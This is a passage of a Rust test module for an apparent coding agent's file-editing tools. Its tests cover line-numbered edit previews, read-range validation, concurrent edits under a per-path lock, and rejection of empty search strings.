                    "instruction": "update greeting",
                    "old_string": "  # greeting\n  print('hi')",
                    "new_string": "    print('hello there')"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(!edit_res.is_error);

        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn test_edit_line_number_calculation() {
        let ws = std::env::temp_dir().join(format!("corex_fs_test_line_calc_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let content = "line 1\nline 2\nline 3\nline 4\nline 5\nline 6\nline 7\nline 8\nline 9\nline 10\n";
        let writer = WriteFileTool;
        writer
            .execute(
                json!({
                    "file_path": "test.txt",
                    "content": content
                }),
                &context,
            )
            .await
            .unwrap();

        let editor = EditTool;
        let res = editor
            .execute(
                json!({
                    "file_path": "test.txt",
                    "old_string": "line 8\n",
                    "new_string": "line 8 modified\n"
                }),
                &context,
            )
            .await
            .unwrap();

        assert!(!res.is_error);
        assert!(res.output.contains("(line 8):"), "Output should contain '(line 8):', got: {}", res.output);
        assert!(res.output.contains("+   8 | line 8 modified"), "Output should show line 8 as added, got: {}", res.output);
        assert!(res.output.contains("-   8 | line 8\n"), "Output should keep the line the edit replaced, got: {}", res.output);

        let diff = editor.format_diff(
            &json!({
                "file_path": "test.txt",
                "old_string": "line 8 modified\n",
                "new_string": "line 8 diff\n"
            }),
            &ws,
        ).unwrap();
        assert!(diff.contains("@@"), "Diff should contain hunk header @@, got: {}", diff);
        assert!(diff.contains("-line 8 modified"));
        assert!(diff.contains("+line 8 diff"));

        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn test_read_file_inverted_range_and_empty_safe() {
        let ws = std::env::temp_dir().join(format!("corex_rf_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let test_file = ws.join("sample.txt");
        fs::write(&test_file, "line 1\nline 2\nline 3\nline 4\nline 5\n").unwrap();

        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let reader = ReadFileTool;

        // Inverted range must return an error and NOT panic
        let res = reader.execute(
            json!({
                "file_path": "sample.txt",
                "start_line": 5,
                "end_line": 2
            }),
            &context,
        ).await.unwrap();
        assert!(res.is_error);
        assert!(res.output.contains("Invalid line range"));

        // Empty file must not panic with start_line > 1
        let empty_file = ws.join("empty.txt");
        fs::write(&empty_file, "").unwrap();
        let res_empty = reader.execute(
            json!({
                "file_path": "empty.txt",
                "start_line": 2
            }),
            &context,
        ).await.unwrap();
        assert!(!res_empty.is_error);
        assert_eq!(res_empty.output, "(Empty file)");

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn test_edit_preview_keeps_the_lines_the_edit_removed() {
        let preview = format_edit_preview("a\nb\nc\nd\ne\n", "a\nB\nc\nd\ne\n");

        assert!(preview.contains("-   2 | b\n"), "the replaced line must be shown, got: {}", preview);
        assert!(preview.contains("+   2 | B\n"), "the new line must be shown, got: {}", preview);
        assert!(preview.contains("    1 | a\n"), "surrounding context keeps its own numbering, got: {}", preview);
    }

    #[test]
    fn test_edit_preview_elides_the_untouched_middle_of_a_long_file() {
        let old: String = (1..=40).map(|i| format!("line {}\n", i)).collect();
        let new = old.replace("line 2\n", "line 2 changed\n").replace("line 38\n", "line 38 changed\n");

        let preview = format_edit_preview(&old, &new);

        assert!(preview.contains("-   2 | line 2\n"), "got: {}", preview);
        assert!(preview.contains("+  38 | line 38 changed\n"), "both far-apart changes must survive, got: {}", preview);
        assert!(preview.contains("lines not shown"), "the untouched middle must be elided, got: {}", preview);
        assert!(!preview.contains("line 20\n"), "elided lines cannot reach the preview, got: {}", preview);
    }

    /// Eight edits to the same file launched concurrently: every single one must land.
    ///
    /// Before the per-path lock this was a lost update — each task read the same original, the last
    /// `rename` won, and the other seven edits vanished while every call still returned success.
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn concurrent_edits_to_the_same_file_all_land() {
        let ws = std::env::temp_dir().join(format!("corex_concurrent_edit_{}", std::process::id()));
        let _ = fs::remove_dir_all(&ws);
        fs::create_dir_all(&ws).unwrap();

        let original: String = (1..=8).map(|i| format!("line {}\n", i)).collect();
        fs::write(ws.join("sample.txt"), &original).unwrap();

        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let mut handles = Vec::new();
        for i in 1..=8 {
            let ctx = context.clone();
            handles.push(tokio::spawn(async move {
                EditTool
                    .execute(
                        json!({
                            "file_path": "sample.txt",
                            "old_string": format!("line {}\n", i),
                            "new_string": format!("LINE {}\n", i),
                        }),
                        &ctx,
                    )
                    .await
                    .unwrap()
            }));
        }

        for handle in handles {
            let res = handle.await.unwrap();
            assert!(!res.is_error, "every edit must succeed, got: {}", res.output);
        }

        let final_content = fs::read_to_string(ws.join("sample.txt")).unwrap();
        let expected: String = (1..=8).map(|i| format!("LINE {}\n", i)).collect();
        assert_eq!(final_content, expected, "every concurrent edit must survive");

        let _ = fs::remove_dir_all(&ws);
    }

    /// An empty needle matches at every offset, so accepting it would report a successful
    /// replacement while silently inserting at position 0. It must be rejected and change nothing.
    #[tokio::test]
    async fn edit_rejects_an_empty_old_string() {
        let ws = std::env::temp_dir().join(format!("corex_empty_old_{}", std::process::id()));
        let _ = fs::remove_dir_all(&ws);
        fs::create_dir_all(&ws).unwrap();
        fs::write(ws.join("sample.txt"), "keep me\n").unwrap();

        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let res = EditTool
            .execute(
                json!({ "file_path": "sample.txt", "old_string": "", "new_string": "injected\n" }),
                &context,
            )
            .await
            .unwrap();

        assert!(res.is_error, "an empty old_string must be rejected, got: {}", res.output);
        assert_eq!(
            fs::read_to_string(ws.join("sample.txt")).unwrap(),
            "keep me\n",
            "the file must be left untouched"
        );

        let _ = fs::remove_dir_all(&ws);
    }

    /// The lock must really exclude: a second holder cannot proceed while the first holds it.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn lock_path_serializes_concurrent_holders() {
        use std::sync::atomic::{AtomicBool, Ordering};

        let ws = std::env::temp_dir().join(format!("corex_lock_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let target = ws.join("target.txt");
        fs::write(&target, "x").unwrap();

        let guard = lock_path(&target).await;

        let acquired = std::sync::Arc::new(AtomicBool::new(false));
        let flag = acquired.clone();
        let path = target.clone();
        let waiter = tokio::spawn(async move {
            let _guard = lock_path(&path).await;
            flag.store(true, Ordering::SeqCst);
        });

        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        assert!(
            !acquired.load(Ordering::SeqCst),
            "a second lock_path must block while the first guard is alive"
        );

        drop(guard);
        waiter.await.unwrap();
        assert!(acquired.load(Ordering::SeqCst));

        let _ = fs::remove_dir_all(&ws);
    }
}
